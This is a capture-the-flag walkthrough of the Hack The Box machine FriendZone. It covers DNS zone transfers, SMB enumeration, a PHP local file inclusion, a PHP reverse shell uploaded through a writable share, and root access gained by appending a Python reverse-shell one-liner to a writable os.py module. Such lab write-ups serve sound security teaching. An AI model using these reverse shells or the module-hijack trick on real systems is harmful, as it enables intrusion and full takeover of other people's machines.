---
title: Hack The Box - FriendZone (Without Metasploit)
date: 2021-01-23 11:53:00 +0800
categories: [hackthebox]
tags: [linux, lfi, module hijack]
image:
    path: /assets/images/friendzone.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.123 friendzone.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a friendzone.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.123:21
Open 10.10.10.123:22
Open 10.10.10.123:53
Open 10.10.10.123:80
Open 10.10.10.123:139
Open 10.10.10.123:443
Open 10.10.10.123:445
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-20 16:35 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:35
Completed NSE at 16:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:35
Completed NSE at 16:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:35
Completed NSE at 16:35, 0.00s elapsed
Initiating Connect Scan at 16:35
Scanning friendzone.htb (10.10.10.123) [7 ports]
Discovered open port 445/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 22/tcp on 10.10.10.123
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Completed Connect Scan at 16:35, 0.01s elapsed (7 total ports)
Initiating Service scan at 16:35
Scanning 7 services on friendzone.htb (10.10.10.123)
Completed Service scan at 16:36, 12.08s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.10.123.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 8.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.13s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up, received user-set (0.0061s latency).
Scanned at 2021-01-20 16:35:48 UTC for 20s

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.3
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo=
|   256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
53/tcp  open  domain      syn-ack ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED/localityName=AMMAN
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED/localityName=AMMAN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
| SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
| -----BEGIN CERTIFICATE-----
| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
| fv9s+GxKNvsBqDBX
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31929/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11328/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37865/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-01-20T18:36:00+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-20T16:36:00
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds
```

# Enumeration (1)

## Port 80 `Apache httpd 2.4.29 ((Ubuntu))`

![](/assets/images/friendzone1.png)

Looking at the email they provided, we see the domain `friendzoneportal.red`. After adding it to our `/etc/hosts`, we then browsed to `http://friendzoneportal.red` but unfortunately we were provided with the same picture.

## Port 53 `ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)`

Lets attempt to perform a zone transfer for the `friendzoneportal.red` domain.

```bash
$ host -t axfr friendzoneportal.red friendzone.htb
Trying "friendzoneportal.red"
Using domain server:
Name: friendzone.htb
Address: 10.10.10.123#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 31060
;; flags: qr aa; QUERY: 1, ANSWER: 9, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzoneportal.red.          IN      AXFR

;; ANSWER SECTION:
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
```

We see 4 new subdomains so lets add them to our `/etc/hosts`.

```bash
$ cat /etc/hosts
10.10.10.123 friendzone.htb friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
...
```

I didn't discover anything new from browsing via the new subdomains we found so let's move on.

## Port 445 `Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)`

Lets see what shares we can access.

```bash
$ nmap -p 445 -Pn friendzone.htb  --script smb-enum-shares
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 12:27 EST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.0095s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

The results tell us we have `READ/WRITE` access to the `Development` and `general` share, but `smbmap` tells us otherwise.

```bash
$ smbmap -H friendzone.htb
[+] Guest session       IP: friendzone.htb:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

There was nothing in the `Development` share but in the `general` share, there was a file `creds.txt` which seemed to contain some credentials.

```bash
$ smbclient //friendzone.htb/general 
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 6420980 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
$ cat creds.txt
admin:WORKWORKHhallelujah@#
```

The credentials seems to belong to some admin panel which we do not where is it yet so lets move on. 

## Port 443 `Apache httpd 2.4.29`

According to the `nmap` results, the common name specified in the `SSL` cert was `friendzone.red`, so lets add it to our `/etc/hosts`. Now lets browse to `https://friendzone.red`.

![](/assets/images/friendzone2.png)

If we look at the `HTML` source code, we see a comment.

![](/assets/images/friendzone3.png)

Going to `https://friendzone.red/js/js/`,

![](/assets/images/friendzone4.png)

we see a `base64`-encoded string that become `gtocYaMn1G1611333797q9mUUbut0Z` when decoded, which I couldn't make sense of it. However, when I refreshed the page multiple times, the `base64`-encoded string would keep changing, which led to me think this was probably nothing important.

Lets see if performing a zone transfer for the `friendzone.red` will return any new domain names.

```bash
$ host -t axfr friendzone.red friendzone.htb 
Trying "friendzone.red"
Using domain server:
Name: friendzone.htb
Address: 10.10.10.123#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12534
;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzone.red.                        IN      AXFR

;; ANSWER SECTION:
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
```

Again, we add the new subdomains to our `/etc/hosts`.

```bash
$ cat /etc/hosts
...
10.10.10.123 friendzone.htb friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

When we browse to `https://administrator1.friendzone.red`, we see a login page!

![](/assets/images/friendzone5.png)

Remember the `creds.txt` we found in the `SMB` service? Using the credentials in it will log us in.

![](/assets/images/friendzone6.png)

It tells us to navigate to `/dashboard.php`.

![](/assets/images/friendzone7.png)

It says that the default params are `image_id=a.jpg&pagename=timestamp` so lets append it to our URL.

![](/assets/images/friendzone8.png)

A line had suddenly pop up at the bottom. I was thinking this `pagename=timestamp` probably caused another file to be loaded and the file as probably called `timestamp.php`. Lets verify the existence of `timestamp.php`.

![](/assets/images/friendzone9.png)

It does exist! It looks like it appends a `.php` at the end of the name before attemping to include it. Let sees if we can retrieve the contents of `dashboard.php` by browsing to setting `pagename` to `php://filter/convert.base64-encode/resource=dashboard`. 

```
PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
``` 

After decoding it, this is what we get:

```php
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

Now that we know we can perform `LFI`, we just need to find a way to upload our malicious `php` file. Lets see if `https://uploads.friendzone.red` has that feature.

![](/assets/images/friendzone10.png)

I attempted uploading various files such as actual images or `.php` files but I was not able to find them. This is where I remembered about the writable `Development` share that we found on the `SMB` server and it seems that it is mapped to the `/etc/Development` directory on the machine.

# Exploitation (1)

I downloaded this [file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and configured it to use my IP address and a port number of my choice.

```bash
$ cat php-reverse-shell.php
...
$ip = '10.10.XX.XX';  // CHANGE THIS
$port = 1337;      // CHANGE THIS
```
```

I then start my `nc` listener:

```bash
$ rlwrap nc -lvnp 1337                                    
listening on [any] 1337 ...
```

and upload the file to the share.

```bash
$ smbclient //friendzone.htb/Development
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php 
putting file php-reverse-shell.php as \php-reverse-shell.php (116.6 kb/s) (average 116.6 kb/s)
```

Now if we browse to `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell`, we get a shell on our listener as `www-data`.

```bash
$ rlwrap nc -lvnp 1337                                    
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.123] 57202
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 20:55:00 up  4:32,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

# Enumeration (2)

In `/var/www`, where all the websites were running from, we see a file `mysql_data.conf` containing database credentials.

```bash
$ cat /var/www/mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

With these credentials, we can switch to `friend`.

```bash
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@FriendZone:/var/www$ su friend
Agpyu12!0.213$

friend@FriendZone:/var/www$ id
id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

# user.txt

The user flag is in `friend`'s home directory.

```bash
friend@FriendZone:/var/www$ cat /home/friend/user.txt
a9edXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (3)

I uploaded `pspy` onto the machine in order to monitor for running processes and saw a `python` script being executed every now and then.

```bash
friend@FriendZone:/tmp$ ./pspy
...
2021/01/20 20:10:01 CMD: UID=0    PID=31303  | /usr/bin/python /opt/server_admin/reporter.py 
2021/01/20 20:10:01 CMD: UID=0    PID=31302  | /bin/sh -c /opt/server_admin/reporter.py 
2021/01/20 20:10:01 CMD: UID=0    PID=31301  | /usr/sbin/CRON -f 
...
```

Here's the contents of `/opt/server_admin/reporter.py`:

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

Hmm we didnt have write permission to the file so we can't really add our own `python` code to it.

Let's use `linux-smart-enumeration` to see we can get more information.


```bash
friend@FriendZone:/tmp$ ./lse.sh -l 2
============================================================( file system )=====```````````````````````````````````````` 
[*] fst000 Writable files outside user's home.............................. yes!                       
---
...
/usr/lib/python2.7
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/os.py
```

It says that we have WRITE access to `os.py`! This means if we can inject code into the `os` module, it will be executed when the `os` module is imported, which `/opt/server_admin/reporter.py` will do!

# Exploitation (2)

We will just append code for a `python` reverse shell to the end of `os.py`.

```
friend@FriendZone:/tmp$ cat /usr/lib/python2.7/os.py
...
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

We then set up our `nc` listener.

```bash
$ rlwrap nc -lvnp 1337 
listening on [any] 1337 ...
```

After a while, when the `/opt/server_admin/reporter.py` is executed by `root`, we will catch a shell as `root`!

```bash
$ rlwrap nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.123] 39574
id
id
uid=0(root) gid=0(root) groups=0(root)
root@FriendZone:~# 
```

# root.txt

The root flag is in `root`'s home directory.

```bash
cat /root/root.txt
b0e6XXXXXXXXXXXXXXXXXXXXXXXXXXXX
root@FriendZone:~#
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !